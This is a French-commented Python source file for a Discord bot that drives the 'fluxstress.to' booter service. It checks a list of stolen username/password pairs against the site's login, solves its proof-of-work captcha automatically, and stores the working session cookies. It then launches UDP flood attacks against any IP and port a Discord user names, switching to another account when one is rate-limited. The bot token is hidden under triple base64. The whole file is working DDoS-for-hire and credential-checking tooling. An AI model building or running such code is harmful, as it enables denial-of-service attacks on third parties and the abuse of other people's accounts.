import discord
from discord.ext import commands
from discord import app_commands
import requests
import re
import hashlib
import time
import base64
import asyncio
import json
from pathlib import Path

# Token encodé de manière sécurisée (triple encodage base64)
def _decode_token():
    # Triple encodage pour masquer le token
    _t1 = "VkZaU1VrMHdOVFpVV0doT1VrVkZNRlF4VWxwbFZURlZXWHBXVUZKSGREWlViV04xVWpCb2FtSjZVWFJNYkZadFZsUmFkR0ZyT1d0a1ZtaG1XVmhvVEU1R1FreGpXRVpGV2xSYVQyTjZTWFJhUmpoNlZHcGtjbVZJWkRCalYzQnU="
    _t2 = base64.b64decode(_t1).decode()
    _t3 = base64.b64decode(_t2).decode()
    return base64.b64decode(_t3).decode()

TOKEN = _decode_token()

API_BASE_LOGIN = "https://challenge.fluxstress.to/2f05f98a86/"
API_BASE_ATTACK = "https://challenge.fluxstress.to/3aa79bd6c5/"
MAX_ATTACK_DURATION = 60

# Fichiers de configuration
LOGIN_FILE = "login.txt"
HITS_FILE = "hits.txt"

# Cache des comptes valides
valid_accounts = []
current_account_index = 0

# =============================================
# PARSING DES LOGINS
# =============================================

def parse_login_file():
    """Parse le fichier login.txt et extrait tous les credentials"""
    accounts = []
    
    if not Path(LOGIN_FILE).exists():
        print(f"❌ Fichier {LOGIN_FILE} introuvable!")
        return accounts
    
    with open(LOGIN_FILE, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Regex pour extraire les credentials
    pattern = r'User:\s+(\S+)\s+Password:\s+(\S+)'
    matches = re.findall(pattern, content)
    
    for username, password in matches:
        accounts.append({
            'username': username,
            'password': password
        })
    
    print(f"✅ {len(accounts)} comptes chargés depuis {LOGIN_FILE}")
    return accounts

def save_valid_account(account_data):
    """Enregistre un compte valide dans hits.txt"""
    with open(HITS_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(account_data) + '\n')
    print(f"💾 Compte sauvegardé: {account_data['username']}")

def load_valid_accounts():
    """Charge les comptes valides depuis hits.txt"""
    accounts = []
    
    if not Path(HITS_FILE).exists():
        return accounts
    
    with open(HITS_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line:
                try:
                    accounts.append(json.loads(line))
                except:
                    pass
    
    print(f"✅ {len(accounts)} comptes valides chargés depuis {HITS_FILE}")
    return accounts

# =============================================
# FLUXSTRESS FUNCTIONS
# =============================================

def fnv32a(s):
    h = 2166136261
    for c in s:
        h ^= ord(c)
        h = (h + (h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24)) & 0xFFFFFFFF
    return h

def xorshift(state):
    state ^= (state << 13) & 0xFFFFFFFF
    state ^= (state >> 17) & 0xFFFFFFFF
    state ^= (state << 5) & 0xFFFFFFFF
    return state & 0xFFFFFFFF

def generate_string(seed_str, length):
    state = fnv32a(seed_str)
    result = ""
    while len(result) < length:
        state = xorshift(state)
        result += format(state, '08x')
    return result[:length]

def solve_pow(salt, target_hex):
    target_bytes = bytes(int(target_hex[i:i+2], 16) for i in range(0, len(target_hex), 2))
    target_len = len(target_bytes)
    nonce = 0
    while True:
        if hashlib.sha256((salt + str(nonce)).encode()).digest()[:target_len] == target_bytes:
            return nonce
        nonce += 1

def solve_challenges(session, api_base):
    print(f"🔐 Résolution du challenge pour: {api_base}")
    res = session.post(f"{api_base}challenge", headers={"Content-Type": "application/json"})
    print(f"   Status: {res.status_code}")
    
    data = res.json()
    token = data["token"]
    ch = data["challenge"]
    c, s, d = ch["c"], ch["s"], ch["d"]
    print(f"   Challenge: c={c}, s={s}, d={d}")
    
    solutions = []
    for i in range(1, c + 1):
        salt = generate_string(f"{token}{i}", s)
        target = generate_string(f"{token}{i}d", d)
        nonce = solve_pow(salt, target)
        solutions.append(nonce)
        print(f"   Solution {i}/{c} trouvée: {nonce}")
    
    redeem = session.post(
        f"{api_base}redeem",
        json={"token": token, "solutions": solutions},
        headers={"Content-Type": "application/json"}
    ).json()
    
    if redeem.get("success"):
        print(f"   ✅ Challenge résolu!")
        return redeem["token"]
    
    print(f"   ❌ Redeem échoué: {redeem}")
    raise Exception(f"Redeem échoué: {redeem}")

def get_csrf_and_session():
    print("\n🌐 Création de la session...")
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
        "Origin": "https://fluxstress.to",
        "Referer": "https://fluxstress.to/auth",
    })
    
    print("   GET https://fluxstress.to/auth")
    res = session.get("https://fluxstress.to/auth")
    print(f"   Status: {res.status_code}")
    
    csrf = re.search(r'id="csrf"[^>]+value="([^"]+)"', res.text)
    csrf_value = csrf.group(1) if csrf else None
    print(f"   CSRF trouvé: {csrf_value[:20]}..." if csrf_value else "   ❌ CSRF non trouvé")
    
    return session, csrf_value

def do_login(session, username, password, csrf, cap_token):
    print(f"\n🔑 Tentative de login pour: {username}")
    print(f"   CSRF: {csrf[:20]}...")
    print(f"   Cap Token: {cap_token[:20]}...")
    
    res = session.post(
        "https://fluxstress.to/api/auth/signin",
        data={"username": username, "password": password, "csrf": csrf, "cap_token": cap_token},
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    
    print(f"   POST https://fluxstress.to/api/auth/signin")
    print(f"   Status: {res.status_code}")
    print(f"   Response: {res.text[:200]}...")
    
    if "success" in res.text.lower():
        print(f"   ✅ Login réussi!")
        # Afficher les cookies reçus
        print(f"   Cookies reçus: {list(session.cookies.keys())}")
        return True
    
    print(f"   ❌ Login échoué!")
    return False

def check_telegram_verification(session):
    """Vérifie si le compte a Telegram lié via la page account"""
    print("\n📱 Vérification du lien Telegram...")
    
    try:
        url = "https://fluxstress.to/panel/account?tab=telegram"
        print(f"   GET {url}")
        
        # Afficher tous les cookies avant la requête
        print(f"   Cookies actifs: {list(session.cookies.keys())}")
        for cookie_name in session.cookies.keys():
            print(f"      - {cookie_name}: {session.cookies.get(cookie_name)[:30]}...")
        
        res = session.get(
            url,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
                "Referer": "https://fluxstress.to/panel"
            }
        )
        
        print(f"   Status: {res.status_code}")
        print(f"   Response length: {len(res.text)} chars")
        
        # Chercher différentes variantes du texte
        search_patterns = [
            '<i class="fa-brands fa-telegram"></i> Your Telegram account is linked!<br>',
            'Your Telegram account is linked!',
            'Telegram account is linked'
        ]
        
        print(f"\n   🔍 Recherche des patterns dans la réponse:")
        for pattern in search_patterns:
            if pattern in res.text:
                print(f"      ✅ Trouvé: '{pattern}'")
                # Afficher le contexte autour du pattern
                index = res.text.find(pattern)
                context_start = max(0, index - 100)
                context_end = min(len(res.text), index + len(pattern) + 100)
                context = res.text[context_start:context_end]
                print(f"      Contexte: ...{context}...")
                return True
            else:
                print(f"      ❌ Non trouvé: '{pattern}'")
        
        # Sauvegarder la réponse pour analyse
        with open('telegram_check_response.html', 'w', encoding='utf-8') as f:
            f.write(res.text)
        print(f"\n   📄 Réponse HTML complète sauvegardée dans 'telegram_check_response.html'")
        
        # Afficher un extrait de la page
        print(f"\n   📋 Extrait de la réponse (500 premiers chars):")
        print(f"   {res.text[:500]}")
        
        return False
        
    except Exception as e:
        print(f"   ❌ Erreur lors de la vérification Telegram: {e}")
        import traceback
        traceback.print_exc()
        return False

def verify_and_save_account(username, password):
    """Vérifie un compte et le sauvegarde si valide"""
    print("\n" + "=" * 80)
    print(f"🔍 VÉRIFICATION DU COMPTE: {username}")
    print("=" * 80)
    
    try:
        session, csrf = get_csrf_and_session()
        if not csrf:
            print(f"❌ Impossible de récupérer le CSRF pour {username}")
            return None
        
        login_cap = solve_challenges(session, API_BASE_LOGIN)
        
        if do_login(session, username, password, csrf, login_cap):
            # Vérifier Telegram via la page account
            telegram_linked = check_telegram_verification(session)
            
            if telegram_linked:
                print(f"\n✅✅✅ TELEGRAM LIÉ POUR {username} ✅✅✅")
                
                # Sauvegarder les cookies et infos
                cookies = session.cookies.get_dict()
                account_data = {
                    'username': username,
                    'password': password,
                    'cookies': cookies,
                    'csrf': csrf,
                    'telegram_linked': True
                }
                
                save_valid_account(account_data)
                return account_data
            else:
                print(f"\n❌❌❌ TELEGRAM NON LIÉ POUR {username} ❌❌❌")
                return None
        else:
            print(f"\n❌ Login échoué pour {username}")
            return None
            
    except Exception as e:
        print(f"\n❌ Erreur lors de la vérification de {username}: {e}")
        import traceback
        traceback.print_exc()
        return None
    
    finally:
        print("=" * 80 + "\n")

def check_all_accounts():
    """Vérifie tous les comptes du fichier login.txt"""
    print("\n" + "=" * 80)
    print("🔍 VÉRIFICATION DE TOUS LES COMPTES")
    print("=" * 80)
    
    accounts = parse_login_file()
    valid_count = 0
    
    for i, account in enumerate(accounts, 1):
        print(f"\n{'=' * 80}")
        print(f"COMPTE {i}/{len(accounts)}")
        print(f"{'=' * 80}")
        
        result = verify_and_save_account(account['username'], account['password'])
        if result:
            valid_count += 1
        
        if i < len(accounts):
            print(f"\n⏳ Pause de 3 secondes avant le prochain compte...")
            time.sleep(3)
    
    print("\n" + "=" * 80)
    print(f"✅ VÉRIFICATION TERMINÉE!")
    print(f"📊 Résultat: {valid_count}/{len(accounts)} comptes valides")
    print("=" * 80 + "\n")

def get_panel_csrf(session):
    print("\n🔐 Récupération du CSRF du panel...")
    res = session.get("https://fluxstress.to/panel/attack", headers={"Referer": "https://fluxstress.to/panel"})
    print(f"   Status: {res.status_code}")
    
    for pattern in [
        r'(?:id|name)="csrf"[^>]+value="([^"]+)"',
        r'"csrf"\s*[=:]\s*["\']([a-f0-9]{32,})["\']',
        r'csrf["\']?\s*[=:]\s*["\']([a-f0-9]{32,})["\']',
    ]:
        match = re.search(pattern, res.text)
        if match:
            csrf = match.group(1)
            print(f"   ✅ CSRF panel trouvé: {csrf[:20]}...")
            return csrf
    
    print(f"   ⚠️  CSRF panel non trouvé")
    return None

def restore_session_from_account(account_data):
    """Restaure une session depuis les données sauvegardées"""
    print(f"\n🔄 Restauration de la session pour: {account_data['username']}")
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
        "Origin": "https://fluxstress.to",
        "Referer": "https://fluxstress.to/panel/attack",
    })
    
    # Restaurer les cookies
    print(f"   Cookies restaurés:")
    for name, value in account_data['cookies'].items():
        session.cookies.set(name, value)
        print(f"      - {name}: {value[:30]}...")
    
    return session

def do_attack(host, port, duration, account_data=None):
    """Lance une attaque avec un compte spécifique"""
    global current_account_index, valid_accounts
    
    print("\n" + "=" * 80)
    print(f"⚡ LANCEMENT D'UNE ATTAQUE")
    print("=" * 80)
    print(f"🎯 Target: {host}:{port}")
    print(f"⏱️  Duration: {duration}s")
    
    # Si pas de compte fourni, utiliser le prochain dans la liste
    if account_data is None:
        if not valid_accounts:
            valid_accounts = load_valid_accounts()
        
        if not valid_accounts:
            raise Exception("Aucun compte valide disponible!")
        
        account_data = valid_accounts[current_account_index % len(valid_accounts)]
    
    print(f"🔑 Compte utilisé: {account_data['username']}")
    
    try:
        # Restaurer la session
        session = restore_session_from_account(account_data)
        
        # Récupérer le CSRF du panel
        panel_csrf = get_panel_csrf(session)
        final_csrf = panel_csrf if panel_csrf else account_data.get('csrf')
        print(f"🔐 CSRF final: {final_csrf[:20]}...")
        
        # Résoudre le challenge d'attaque (avec retry si captcha échoue)
        max_cap_retries = 3
        attack_cap = None
        for cap_attempt in range(max_cap_retries):
            attack_cap = solve_challenges(session, API_BASE_ATTACK)
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
                "Origin": "https://fluxstress.to",
                "Referer": "https://fluxstress.to/panel/attack",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "*/*",
                "DNT": "1",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            
            payload = {
                "host": host,
                "time": str(min(duration, MAX_ATTACK_DURATION)),
                "port": str(port),
                "method": "UDP-FREE",
                "concs": "1",
                "cap_token": attack_cap,
                "csrf": final_csrf
            }
            
            print(f"\n📤 Envoi de la requête d'attaque (tentative {cap_attempt+1}/{max_cap_retries})...")
            print(f"   POST https://fluxstress.to/panel/api/user/launch?type=l4")
            print(f"   Payload: {payload}")
            
            res = session.post(
                "https://fluxstress.to/panel/api/user/launch",
                params={"type": "l4"},
                data=payload,
                headers=headers
            )
            
            print(f"   Status: {res.status_code}")
            print(f"   Response: {res.text}")
            
            result = res.json() if res.status_code == 200 else None
            
            # Si 404 ou réponse vide, passer au compte suivant
            if res.status_code != 200 or result is None:
                print(f"   ⚠️  Réponse invalide (status {res.status_code}), passage au compte suivant...")
                current_account_index += 1
                if current_account_index < len(valid_accounts):
                    return do_attack(host, port, duration)
                else:
                    current_account_index = 0
                    raise Exception("❌ Attaque impossible, contacter le fournisseur.")
            
            # Si captcha failed, on re-résout le challenge
            if result and "captcha" in str(result).lower():
                print(f"   ⚠️  Captcha échoué, nouveau challenge en cours...")
                time.sleep(1)
                continue
            
            # Sinon on sort de la boucle
            break
        
        # Vérifier si l'IP est déjà down
        if result:
            result_str = str(result).lower()
            if "already down" in result_str or "déjà down" in result_str or "is already" in result_str:
                print(f"\n⚠️  IP déjà down détectée, on ne passe PAS à un autre compte.")
                raise Exception("⚠️ Cette IP est déjà down, veuillez en mettre une autre.")
            
            if "rate-limited" in result_str or "rate limited" in result_str:
                print(f"\n⚠️⚠️⚠️  COMPTE RATE-LIMITED: {account_data['username']}")
                current_account_index += 1
                if current_account_index < len(valid_accounts):
                    print(f"🔄 Passage au compte suivant...")
                    return do_attack(host, port, duration)
                else:
                    current_account_index = 0
                    raise Exception("❌ Attaque impossible, contacter le fournisseur.")
        
        print("=" * 80 + "\n")
        return result
    
    except Exception as e:
        print(f"\n❌ Erreur avec le compte {account_data['username']}: {e}")
        import traceback
        traceback.print_exc()
        
        # Si tous les comptes sont épuisés, on remonte l'erreur directement
        if "contacter le fournisseur" in str(e) or "déjà down" in str(e):
            raise e
        
        # Essayer avec le prochain compte pour les autres erreurs
        current_account_index += 1
        if current_account_index < len(valid_accounts):
            print(f"🔄 Tentative avec le compte suivant...")
            return do_attack(host, port, duration)
        else:
            current_account_index = 0
            raise e

# =============================================
# DISCORD BOT
# =============================================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"[+] Bot connecté: {bot.user}")
    
    # Charger les comptes valides au démarrage
    global valid_accounts
    valid_accounts = load_valid_accounts()
    
    if not valid_accounts:
        print("\n⚠️  Aucun compte valide trouvé dans hits.txt")
        print("💡 Utilisez la commande /check pour vérifier les comptes de login.txt\n")

@bot.tree.command(name="check", description="Vérifier tous les comptes dans login.txt")
async def check(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True)
    
    embed = discord.Embed(
        title="🔍 Vérification des comptes...",
        description="Vérification en cours, cela peut prendre quelques minutes...\nRegardez la console pour les détails.",
        color=0xffcc00
    )
    await interaction.followup.send(embed=embed)
    
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, check_all_accounts)
    
    # Recharger les comptes valides
    global valid_accounts
    valid_accounts = load_valid_accounts()
    
    embed = discord.Embed(
        title="✅ Vérification terminée!",
        description=f"**{len(valid_accounts)}** comptes valides trouvés et sauvegardés dans `hits.txt`",
        color=0x00ff88
    )
    await interaction.edit_original_response(embed=embed)

@bot.tree.command(name="attack", description="Launch a stress test")
@app_commands.describe(
    ip="Target IP address",
    port="Target port",
    time="Duration in seconds (max 60)"
)
async def attack(interaction: discord.Interaction, ip: str, port: int, time: int):
    global valid_accounts
    
    if not valid_accounts:
        valid_accounts = load_valid_accounts()
    
    if not valid_accounts:
        embed = discord.Embed(
            title="❌ Aucun compte disponible",
            description="Utilisez `/check` pour vérifier les comptes dans login.txt",
            color=0xff4444
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    embed = discord.Embed(
        title="⚡ Preparing Attack...",
        description=f"Target: `{ip}:{port}` | Duration: `{min(time, MAX_ATTACK_DURATION)}s`",
        color=0xffcc00
    )
    await interaction.followup.send(embed=embed)
    
    loop = asyncio.get_event_loop()
    try:
        result = await loop.run_in_executor(None, lambda: do_attack(ip, port, time))
    except Exception as e:
        embed = discord.Embed(
            title="⚠️ Attaque impossible",
            description=str(e),
            color=0xff8800
        )
        await interaction.edit_original_response(embed=embed)
        return
    
    if result and result.get("status") == "success":
        end_time = "N/A"
        if result.get("attack_summary"):
            end_time = result["attack_summary"][0].get("end_time", "N/A")
        
        embed = discord.Embed(
            title="✅ Attack Successfully Sent!",
            color=0x00ff88
        )
        embed.add_field(name="🎯 Target", value=f"`{ip}:{port}`", inline=True)
        embed.add_field(name="⏱ Duration", value=f"`{min(time, MAX_ATTACK_DURATION)}s`", inline=True)
        embed.add_field(name="🔧 Method", value="`UDP-FREE`", inline=True)
        embed.add_field(name="🏁 End Time", value=f"`{end_time}`", inline=False)
        embed.add_field(name="🔑 Account", value=f"`{valid_accounts[current_account_index % len(valid_accounts)]['username']}`", inline=False)
        embed.set_footer(text=f"Requested by {interaction.user.name}")
        await interaction.edit_original_response(embed=embed)
    
    else:
        msg = result.get("message", "Unknown error") if result else "No response"
        embed = discord.Embed(
            title="❌ Attack Failed",
            description=f"```{msg}```",
            color=0xff4444
        )
        await interaction.edit_original_response(embed=embed)

if __name__ == "__main__":
    print("=" * 80)
    print("🤖 FluxStress Discord Bot - Version Debug")
    print("=" * 80)
    print(f"✅ Token décodé avec succès")
    print(f"📁 Fichier logins: {LOGIN_FILE}")
    print(f"📁 Fichier hits: {HITS_FILE}")
    print(f"🚀 Démarrage du bot...\n")
    bot.run(TOKEN)
